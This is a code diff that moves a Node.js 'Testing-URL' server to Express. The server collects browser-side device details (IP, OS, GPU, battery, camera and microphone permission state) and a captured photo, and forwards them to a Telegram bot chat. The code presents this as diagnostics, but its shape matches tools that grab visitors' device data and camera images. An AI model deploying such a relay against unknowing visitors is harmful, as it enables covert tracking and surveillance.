@@ -1,403 +1,704 @@
-import "dotenv/config";
+"use strict";
 
-import http from "node:http";
-import crypto from "node:crypto";
-import { readFile } from "node:fs/promises";
-import path from "node:path";
-import { fileURLToPath } from "node:url";
+const express = require("express");
+const session = require("express-session");
+const dotenv = require("dotenv");
+const path = require("path");
+const multer = require("multer");
 
-const __filename = fileURLToPath(import.meta.url);
-const __dirname = path.dirname(__filename);
+dotenv.config();
 
-const PUBLIC_DIR = path.join(__dirname, "public");
-const PORT = process.env.PORT || 3000;
+const app = express();
+const PORT = Number(process.env.PORT) || 3000;
 
+/*
+ * =========================================================
+ * CONFIG
+ * =========================================================
+ */
+
+const PASSWORD = process.env.SITE_PASSWORD;
 const BOT_TOKEN = process.env.BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-const SITE_PASSWORD = process.env.SITE_PASSWORD;
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-if (!BOT_TOKEN || !TELEGRAM_CHAT_ID || !SITE_PASSWORD) {
-    console.error(
-        "Missing BOT_TOKEN, TELEGRAM_CHAT_ID, or SITE_PASSWORD in .env"
-    );
-    process.exit(1);
-}
-
-// In-memory sessions.
-// They disappear automatically when the server restarts.
-const sessions = new Map();
-
-function createSession() {
-    const token = crypto.randomBytes(32).toString("hex");
-
-    sessions.set(token, {
-        createdAt: Date.now()
-    });
-
-    return token;
-}
-
-function getSession(request) {
-    const cookie = request.headers.cookie || "";
-
-    const match = cookie.match(
-        /(?:^|;\s*)session=([^;]+)/
-    );
-
-    if (!match) {
-        return null;
-    }
-
-    const session = sessions.get(match[1]);
-
-    if (!session) {
-        return null;
-    }
-
-    // 12-hour session lifetime.
-    if (Date.now() - session.createdAt > 12 * 60 * 60 * 1000) {
-        sessions.delete(match[1]);
-        return null;
-    }
-
-    return match[1];
-}
-
-function getClientIP(request) {
-    return request.socket.remoteAddress || null;
-}
-
-function isLocalAddress(ip) {
-    return (
-        ip === "::1" ||
-        ip === "127.0.0.1" ||
-        ip === "localhost"
+if (!PASSWORD) {
+    console.warn(
+        "WARNING: PASSWORD is not configured in .env"
     );
 }
 
-function normalizeIP(ip) {
-    if (!ip) {
-        return null;
-    }
-
-    if (ip.startsWith("::ffff:")) {
-        return ip.substring(7);
-    }
-
-    return ip;
+if (!BOT_TOKEN || !CHAT_ID) {
+    console.warn(
+        "WARNING: BOT_TOKEN or CHAT_ID is not configured."
+    );
 }
 
-function getContentType(filePath) {
-    const extension = path.extname(filePath).toLowerCase();
 
-    const types = {
-        ".html": "text/html; charset=utf-8",
-        ".css": "text/css; charset=utf-8",
-        ".js": "text/javascript; charset=utf-8"
-    };
+/*
+ * =========================================================
+ * MIDDLEWARE
+ * =========================================================
+ */
 
-    return types[extension] || "application/octet-stream";
-}
+app.disable("x-powered-by");
 
-function readBody(request) {
-    return new Promise((resolve, reject) => {
-        let body = "";
+app.use(
+    express.json({
+        limit: "1mb"
+    })
+);
 
-        request.on("data", chunk => {
-            body += chunk;
+app.use(
+    express.urlencoded({
+        extended: false
+    })
+);
 
-            if (body.length > 100_000) {
-                reject(new Error("Request body too large"));
-                request.destroy();
-            }
+app.use(
+    session({
+        secret:
+            process.env.SESSION_SECRET ||
+            "change-this-session-secret",
+
+        resave: false,
+
+        saveUninitialized: false,
+
+        cookie: {
+            httpOnly: true,
+            sameSite: "lax",
+            secure:
+                process.env.NODE_ENV === "production",
+
+            maxAge:
+                1000 * 60 * 60 * 8
+        }
+    })
+);
+
+
+/*
+ * =========================================================
+ * STATIC FILES
+ * =========================================================
+ */
+
+app.use(
+    express.static(
+        path.join(__dirname, "public")
+    )
+);
+
+
+/*
+ * =========================================================
+ * AUTHENTICATION
+ * =========================================================
+ */
+
+function requireAuth(req, res, next) {
+    if (
+        !req.session ||
+        req.session.authenticated !== true
+    ) {
+        return res.status(401).json({
+            success: false,
+            message: "Authentication required."
         });
-
-        request.on("end", () => resolve(body));
-        request.on("error", reject);
-    });
-}
-
-function json(response, status, data) {
-    response.writeHead(status, {
-        "Content-Type": "application/json; charset=utf-8",
-        "Cache-Control": "no-store"
-    });
-
-    response.end(JSON.stringify(data));
-}
-
-async function sendTelegramReport(report) {
-    const url =
-        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-    const response = await fetch(url, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: report
-        })
-    });
-
-    if (!response.ok) {
-        throw new Error(
-            `Telegram API returned ${response.status}`
-        );
     }
+
+    next();
 }
 
-function formatReport(data, request) {
-    const rawIP = normalizeIP(getClientIP(request));
 
-    const ip = rawIP
-        ? isLocalAddress(rawIP)
-            ? "Localhost"
-            : rawIP
-        : "Unavailable";
+app.get(
+    "/api/auth",
+    (req, res) => {
+        res.setHeader(
+            "Cache-Control",
+            "no-store"
+        );
 
-    const safe = value =>
-        value === undefined ||
-        value === null ||
-        value === ""
-            ? "Not reported"
-            : String(value);
+        res.json({
+            authenticated:
+                req.session?.authenticated === true
+        });
+    }
+);
+
+
+app.post(
+    "/api/login",
+    (req, res) => {
+        const password =
+            typeof req.body?.password === "string"
+                ? req.body.password
+                : "";
+
+        if (
+            !PASSWORD ||
+            password !== PASSWORD
+        ) {
+            return res.status(401).json({
+                success: false,
+                message: "Incorrect password."
+            });
+        }
+
+        req.session.authenticated = true;
+
+        res.json({
+            success: true
+        });
+    }
+);
+
+
+app.post(
+    "/api/logout",
+    requireAuth,
+    (req, res) => {
+        req.session.destroy(() => {
+            res.json({
+                success: true
+            });
+        });
+    }
+);
+
+
+/*
+ * =========================================================
+ * SERVER-OBSERVED IP
+ * =========================================================
+ */
+
+function getClientIp(req) {
+    /*
+     * In local development this can be:
+     * ::1
+     * 127.0.0.1
+     *
+     * Behind a trusted reverse proxy, configure
+     * trust proxy appropriately before relying on
+     * forwarded headers.
+     */
+
+    const remoteAddress =
+        req.socket?.remoteAddress ||
+        "";
+
+    return remoteAddress;
+}
+
+
+app.get(
+    "/api/ip",
+    requireAuth,
+    (req, res) => {
+        res.setHeader(
+            "Cache-Control",
+            "no-store"
+        );
+
+        res.json({
+            success: true,
+            ip: getClientIp(req)
+        });
+    }
+);
+
+
+/*
+ * =========================================================
+ * DIAGNOSTIC REPORT
+ * =========================================================
+ */
+
+function sanitizeReport(report) {
+    if (
+        !report ||
+        typeof report !== "object"
+    ) {
+        return {};
+    }
+
+    /*
+     * Keep the report JSON-size bounded.
+     */
+
+    const serialized =
+        JSON.stringify(report);
+
+    if (
+        serialized.length > 100000
+    ) {
+        return {};
+    }
+
+    return report;
+}
+
+
+function buildTelegramCaption(
+    report,
+    ip
+) {
+    const device =
+        report.device || {};
+
+    const browser =
+        report.browser || {};
+
+    const display =
+        report.display || {};
+
+    const network =
+        report.network || {};
+
+    const battery =
+        report.battery || {};
+
+    const graphics =
+        report.graphics || {};
+
+    const permissions =
+        report.permissions || {};
 
     return [
-        "🖥 DEVICE INFORMATION",
+        "🖥 DEVICE DIAGNOSTIC",
         "",
-        `OS: ${safe(data.device?.os)}`,
-        `Platform: ${safe(data.device?.platform)}`,
-        `Device Type: ${safe(data.device?.type)}`,
-        `CPU Cores: ${safe(data.device?.cpuCores)}`,
-        `Memory: ${safe(data.device?.memory)}`,
+        `OS: ${device.operatingSystem || "N/A"}`,
+        `Platform: ${device.platform || "N/A"}`,
+        `Device: ${device.deviceType || "N/A"}`,
+        `CPU Cores: ${device.cpuCores || "N/A"}`,
+        `Memory: ${device.memory || "N/A"}`,
         "",
         "🌐 BROWSER",
         "",
-        `Browser: ${safe(data.browser?.name)}`,
-        `Version: ${safe(data.browser?.version)}`,
-        `Language: ${safe(data.browser?.language)}`,
-        `Timezone: ${safe(data.browser?.timezone)}`,
+        `Browser: ${browser.browser || "N/A"}`,
+        `Version: ${browser.version || "N/A"}`,
+        `Language: ${browser.language || "N/A"}`,
+        `Timezone: ${browser.timezone || "N/A"}`,
         "",
         "📺 DISPLAY",
         "",
-        `Resolution: ${safe(data.display?.resolution)}`,
-        `Viewport: ${safe(data.display?.viewport)}`,
-        `Pixel Ratio: ${safe(data.display?.pixelRatio)}`,
-        `Color Depth: ${safe(data.display?.colorDepth)}`,
+        `Resolution: ${display.resolution || "N/A"}`,
+        `Viewport: ${display.viewport || "N/A"}`,
+        `Pixel Ratio: ${display.devicePixelRatio || "N/A"}`,
         "",
         "🌐 NETWORK",
         "",
-        `Public IP: ${ip}`,
-        `Connection: ${safe(data.network?.effectiveType)}`,
-        `Downlink: ${safe(data.network?.downlink)}`,
-        `RTT: ${safe(data.network?.rtt)}`,
+        `Public/Observed IP: ${ip || "N/A"}`,
+        `Connection: ${network.effectiveType || "N/A"}`,
+        `Downlink: ${network.downlink || "N/A"}`,
+        `RTT: ${network.rtt || "N/A"}`,
         "",
         "🔋 BATTERY",
         "",
-        `Level: ${safe(data.battery?.level)}`,
-        `Charging: ${safe(data.battery?.charging)}`,
+        `Level: ${battery.level || "N/A"}`,
+        `Charging: ${battery.charging || "N/A"}`,
         "",
         "🎮 GRAPHICS",
         "",
-        `GPU: ${safe(data.graphics?.renderer)}`,
+        `GPU: ${graphics.gpu || "N/A"}`,
         "",
         "🔐 PERMISSIONS",
         "",
-        `Geolocation: ${safe(data.permissions?.geolocation)}`,
-        `Camera: ${safe(data.permissions?.camera)}`,
-        `Microphone: ${safe(data.permissions?.microphone)}`,
-        `Notifications: ${safe(data.permissions?.notifications)}`,
+        `Location: ${permissions.geolocation || "N/A"}`,
+        `Camera: ${permissions.camera || "N/A"}`,
+        `Microphone: ${permissions.microphone || "N/A"}`,
+        `Notifications: ${permissions.notifications || "N/A"}`,
         "",
-        `🕒 Report time: ${new Date().toISOString()}`
+        `🕒 ${report.timestamp || new Date().toISOString()}`
     ].join("\n");
 }
 
-const server = http.createServer(async (request, response) => {
-    try {
-        const url = new URL(
-            request.url,
-            `http://${request.headers.host || "localhost"}`
+
+async function sendTelegramMessage(
+    caption
+) {
+    const url =
+        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    const response =
+        await fetch(
+            url,
+            {
+                method: "POST",
+
+                headers: {
+                    "Content-Type":
+                        "application/json"
+                },
+
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: caption
+                })
+            }
         );
 
-        // Login
-        if (
-            request.method === "POST" &&
-            url.pathname === "/api/login"
-        ) {
-            const body = await readBody(request);
+    const data =
+        await response.json();
 
-            let parsed;
+    if (
+        !response.ok ||
+        !data.ok
+    ) {
+        throw new Error(
+            "Telegram sendMessage failed."
+        );
+    }
 
-            try {
-                parsed = JSON.parse(body);
-            } catch {
-                json(response, 400, {
+    return data;
+}
+
+
+/*
+ * Normal diagnostic report.
+ *
+ * This endpoint is authenticated.
+ */
+
+app.post(
+    "/api/report",
+    requireAuth,
+    async (req, res) => {
+        try {
+            const report =
+                sanitizeReport(
+                    req.body
+                );
+
+            const ip =
+                getClientIp(req);
+
+            if (!BOT_TOKEN || !CHAT_ID) {
+                return res.status(500).json({
                     success: false,
-                    error: "Invalid request"
+                    message:
+                        "Telegram configuration is missing."
                 });
-                return;
             }
 
-            const password = String(parsed.password || "");
+            const caption =
+                buildTelegramCaption(
+                    report,
+                    ip
+                );
 
-            if (
-                password.length === 0 ||
-                password !== SITE_PASSWORD
-            ) {
-                json(response, 401, {
-                    success: false,
-                    error: "Invalid password"
-                });
-                return;
-            }
-
-            const session = createSession();
-
-            response.writeHead(200, {
-                "Content-Type": "application/json; charset=utf-8",
-                "Cache-Control": "no-store",
-                "Set-Cookie":
-                    `session=${session}; HttpOnly; SameSite=Strict; Path=/; Max-Age=43200`
-            });
-
-            response.end(
-                JSON.stringify({
-                    success: true
-                })
+            await sendTelegramMessage(
+                caption
             );
 
-            return;
-        }
-
-        // Authentication status
-        if (
-            request.method === "GET" &&
-            url.pathname === "/api/auth"
-        ) {
-            json(response, 200, {
-                authenticated: Boolean(getSession(request))
-            });
-
-            return;
-        }
-
-        // IP endpoint
-        if (
-            request.method === "GET" &&
-            url.pathname === "/api/ip"
-        ) {
-            if (!getSession(request)) {
-                json(response, 401, {
-                    error: "Authentication required"
-                });
-                return;
-            }
-
-            const ip = normalizeIP(getClientIP(request));
-
-            json(response, 200, {
-                ip: isLocalAddress(ip)
-                    ? null
-                    : ip,
-                local: isLocalAddress(ip),
-                stored: false
-            });
-
-            return;
-        }
-
-        // Telegram report endpoint
-        if (
-            request.method === "POST" &&
-            url.pathname === "/api/report"
-        ) {
-            if (!getSession(request)) {
-                json(response, 401, {
-                    success: false,
-                    error: "Authentication required"
-                });
-                return;
-            }
-
-            const body = await readBody(request);
-
-            let data;
-
-            try {
-                data = JSON.parse(body);
-            } catch {
-                json(response, 400, {
-                    success: false,
-                    error: "Invalid report"
-                });
-                return;
-            }
-
-            const report = formatReport(data, request);
-
-            await sendTelegramReport(report);
-
-            json(response, 200, {
+            res.json({
                 success: true
             });
 
-            return;
+        } catch (error) {
+            console.error(
+                "Diagnostic report error:",
+                error
+            );
+
+            res.status(500).json({
+                success: false,
+                message:
+                    "Unable to send diagnostic report."
+            });
         }
+    }
+);
 
-        // Static files
-        if (request.method !== "GET") {
-            response.writeHead(405);
-            response.end("Method Not Allowed");
-            return;
+
+/*
+ * =========================================================
+ * PHOTO UPLOAD
+ * =========================================================
+ */
+
+const upload =
+    multer({
+        storage:
+            multer.memoryStorage(),
+
+        limits: {
+            fileSize:
+                5 * 1024 * 1024
+        },
+
+        fileFilter:
+            (req, file, callback) => {
+
+                const allowed =
+                    [
+                        "image/jpeg",
+                        "image/png",
+                        "image/webp"
+                    ];
+
+                if (
+                    allowed.includes(
+                        file.mimetype
+                    )
+                ) {
+                    callback(
+                        null,
+                        true
+                    );
+                } else {
+                    callback(
+                        new Error(
+                            "Only image files are allowed."
+                        )
+                    );
+                }
+            }
+    });
+
+
+/*
+ * Send photo + diagnostic report.
+ *
+ * This endpoint does NOT capture anything itself.
+ * The browser must explicitly send the captured photo.
+ */
+
+app.post(
+    "/api/photo-report",
+    requireAuth,
+    upload.single("photo"),
+    async (req, res) => {
+        console.log("\n========== PHOTO REPORT ==========");
+
+        try {
+            console.log("Authenticated:", req.session?.authenticated);
+            console.log("Photo received:", !!req.file);
+
+            if (!req.file) {
+                console.log("ERROR: No photo received");
+
+                return res.status(400).json({
+                    success: false,
+                    message: "No photo supplied."
+                });
+            }
+
+            let report = {};
+
+            try {
+                report = JSON.parse(
+                    req.body?.report || "{}"
+                );
+            } catch (error) {
+                console.log(
+                    "ERROR: Invalid report JSON"
+                );
+
+                return res.status(400).json({
+                    success: false,
+                    message: "Invalid report data."
+                });
+            }
+
+            console.log(
+                "Report received:",
+                Object.keys(report)
+            );
+
+            const ip =
+                getClientIp(req);
+
+            console.log(
+                "Server observed IP:",
+                ip
+            );
+
+            console.log(
+                "Telegram configured:",
+                !!BOT_TOKEN && !!CHAT_ID
+            );
+
+            const caption =
+                buildTelegramCaption(
+                    report,
+                    ip
+                );
+
+            const form =
+                new FormData();
+
+            form.append(
+                "chat_id",
+                CHAT_ID
+            );
+
+            form.append(
+                "caption",
+                caption
+            );
+
+            form.append(
+                "photo",
+                new Blob(
+                    [req.file.buffer],
+                    {
+                        type:
+                            req.file.mimetype
+                    }
+                ),
+                "diagnostic-photo.jpg"
+            );
+
+            console.log(
+                "Sending photo to Telegram..."
+            );
+
+            const telegramUrl =
+                `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+
+            const telegramResponse =
+                await fetch(
+                    telegramUrl,
+                    {
+                        method: "POST",
+                        body: form
+                    }
+                );
+
+            const telegramData =
+                await telegramResponse.json();
+
+            console.log(
+                "Telegram status:",
+                telegramResponse.status
+            );
+
+            console.log(
+                "Telegram response:",
+                telegramData
+            );
+
+            if (
+                !telegramResponse.ok ||
+                !telegramData.ok
+            ) {
+                return res.status(502).json({
+                    success: false,
+                    message:
+                        telegramData.description ||
+                        "Telegram delivery failed."
+                });
+            }
+
+            console.log(
+                "SUCCESS: Report sent to Telegram"
+            );
+
+            console.log(
+                "================================\n"
+            );
+
+            res.json({
+                success: true
+            });
+
+        } catch (error) {
+
+            console.error(
+                "PHOTO REPORT ERROR:",
+                error
+            );
+
+            console.log(
+                "================================\n"
+            );
+
+            res.status(500).json({
+                success: false,
+                message:
+                    error.message ||
+                    "Unable to send photo report."
+            });
         }
+    }
+);
 
-        const requestedPath =
-            url.pathname === "/"
-                ? "/index.html"
-                : url.pathname;
 
-        const safePath = path.normalize(
-            requestedPath.replace(/^[/\\]+/, "")
-        );
+/*
+ * =========================================================
+ * ERROR HANDLER
+ * =========================================================
+ */
 
-        const filePath = path.join(
-            PUBLIC_DIR,
-            safePath
+app.use(
+    (error, req, res, next) => {
+        console.error(
+            "Server error:",
+            error
         );
 
         if (
-            filePath !== PUBLIC_DIR &&
-            !filePath.startsWith(
-                `${PUBLIC_DIR}${path.sep}`
-            )
+            error instanceof multer.MulterError
         ) {
-            response.writeHead(403);
-            response.end("Forbidden");
-            return;
+            return res.status(400).json({
+                success: false,
+                message:
+                    "Photo upload failed."
+            });
         }
 
-        const content = await readFile(filePath);
+        if (
+            error?.message ===
+            "Only image files are allowed."
+        ) {
+            return res.status(400).json({
+                success: false,
+                message:
+                    error.message
+            });
+        }
 
-        response.writeHead(200, {
-            "Content-Type": getContentType(filePath),
-            "Cache-Control": "no-store"
+        res.status(500).json({
+            success: false,
+            message:
+                "Internal server error."
         });
-
-        response.end(content);
-    } catch (error) {
-        console.error("Server error:", error.message);
-
-        if (!response.headersSent) {
-            response.writeHead(500);
-            response.end("Internal Server Error");
-        }
     }
-});
+);
 
-server.listen(PORT, () => {
-    console.log(
-        `Testing-URL running at http://localhost:${PORT}`
-    );
-});
+
+/*
+ * =========================================================
+ * SPA FALLBACK
+ * =========================================================
+ */
+
+app.use(
+    (req, res) => {
+        res.sendFile(
+            path.join(
+                __dirname,
+                "public",
+                "index.html"
+            )
+        );
+    }
+);
+
+
+/*
+ * =========================================================
+ * START SERVER
+ * =========================================================
+ */
+
+app.listen(
+    PORT,
+    () => {
+        console.log(
+            `Testing-URL running at http://localhost:${PORT}`
+        );
+    }
+);
